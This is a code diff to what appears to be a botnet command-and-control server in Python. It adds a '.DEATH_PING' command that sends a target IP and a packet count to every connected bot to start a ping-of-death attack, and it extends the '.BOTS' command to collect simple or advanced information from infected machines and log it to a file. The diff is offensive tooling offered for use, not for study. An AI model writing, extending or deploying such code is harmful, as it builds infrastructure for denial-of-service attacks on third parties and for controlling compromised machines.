@@ -16,7 +16,7 @@ banner = f'''
                   ┃ █████╗░░██║░░░░░███████║██╔████╔██║█████╗░░ ┃
                   ┃ ██╔══╝░░██║░░░░░██╔══██║██║╚██╔╝██║██╔══╝░░ ┃
                   ┃ ██║░░░░░███████╗██║░░██║██║░╚═╝░██║███████╗ ┃
-                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ {Fore.GREEN}-V0.2
+                  ┃ ╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝ ┃ \x1b[4;32;40m-V0.2\x1b[0m
                   ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
         '''
 
@@ -119,7 +119,7 @@ def command_line(client):
                 send(client, '.CLEAR: Clears the screen')
                 send(client, '.LOGOUT: Disconnects from server')
                 send(client, '.BOTS: Displays info of connected bots.')
-                send(client, '.POPUP: Displays a popup to all bots, instead of a space, do an asterisk aka the * symbol')
+                send(client, '.DEATH_PING [Target IP] [Packets to send]: Sends a ping of death to a target.')
                 send(client, '')
 
             elif command.upper() == '.CLEAR':
@@ -133,14 +133,73 @@ def command_line(client):
                 break
 
             elif command.upper() == '.BOTS':
-                if (len(args) == 1):
-                    for bot in bots.keys():
-                        send(bot, 'INFO_REQUEST', False, False)
-                        send(client, bot.recv(1024).decode())
+                if (len(args) ==3):
+                    if (args[2].lower() == "simple"):
+                        for bot in bots.keys():
+                            send(bot, 'INFO_REQUEST_SIMPLE', False, False)
+                            if (args[1].lower() == "console"):
+                                send(client, bot.recv(1024).decode())
+                            elif (args[1].lower() == "file"):
+                                with open("bots.txt", "a+") as bf: #bf means bots file
+                                    bf.write(bot.recv(1024).decode() + '\n')
+                            else:
+                                sent = 0
+                                if (sent == 0):
+                                    send(client, "arg one was not console nor file, the output will not be saved anywhere")
+                                    sent += 1
+                                else:
+                                    pass
+                    elif (args[2].lower() == "advanced"):
+                        for bot in bots.keys():
+                            send(bot, 'INFO_REQUEST_ADVANCED', False, False)
+                            if (args[1].lower() == "console"):
+                                send(client, bot.recv(1024).decode())
+                            elif (args[1].lower() == "file"):
+                                try:
+                                    with open("bots.txt", "a+") as bf: #bf means bots file
+                                        bf.write(bot.recv(1024).decode() + '\n')
+                                except Exception as e:
+                                    print(e)
+                            else:
+                                sent = 0
+                                if (sent == 0):
+                                    send(client, "arg one was not console nor file, the output will not be saved anywhere")
+                                    sent += 1
+                                else:
+                                    pass
                 else:
-                    send(client, "This command takes no args.")
+                    send(client, "This command takes two args, [console\\file] [simple\\advanced]")
 
-            
+            elif command.upper() == ".DEATH_PING":
+                if (len(args) == 3):
+                    ip_ = args[1]
+                    packets_ = args[2]
+                    if (validate_ip(ip_)):
+                        for bot in bots.keys():
+                            send(bot, f'DEATH_PING{ip_}||{packets_}')
+                        if (len(bots) == 1):
+                            send(client, "Attack sent to 1 bot")
+                        else:
+                            send(client, f"Attack sent to {len(bots)} bots")
+                    else:
+                        send(client, "Invalid IP")
+
+
+            elif command.upper() == 'DEV.COLORS':
+                for style in range(8):
+                    for fg in range(30,38):
+                        s1 = ''
+                        for bg in range(40,48):
+                            format = ';'.join([str(style), str(fg), str(bg)])
+                            s1 += '\x1b[%sm %s \x1b[0m' % (format, format)
+                            cf.write(s1+'\n')
+                        send(client, s1)
+                    send(client, '\r\n')
+
+            else:
+                send(client, "Invalid command")
+
+            send(client, prompt, False)
 
         except:
             break
